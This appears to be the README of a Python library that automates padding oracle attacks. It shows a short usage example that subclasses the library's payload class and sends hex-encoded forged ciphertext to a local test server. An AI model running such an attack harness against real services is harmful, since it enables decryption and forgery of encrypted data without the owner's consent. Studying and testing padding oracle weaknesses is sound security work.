a library for padding oracle attack
---

Payload_model is a abstract class handling all details of padding oracle attack algorithm.
You should specify a subclass of payload_model and change some import methods. You can customize it to fit different environment.

basic usge
---
```python
from padding_oracle_attack import payload_model
import grequests
from grequests import request

class payload(payload_model):

    def make_request(self, fake_data) -> request:
        params = {
                "data": bytes.hex(fake_data)
            }

        return request("get", "http://127.0.0.1:5000", params=params)

if __name__ == "__main__":
    m = payload("3a10f84900818b1c439430600524fb0f00000000000000000000000000000000")
    m.run()
```
![record](https://github.com/lcark/padding_oracle_attack/raw/main/media/Fpadding_snap.GIF)

result picture
---

![result](https://github.com/lcark/padding_oracle_attack/raw/main/media/result.png)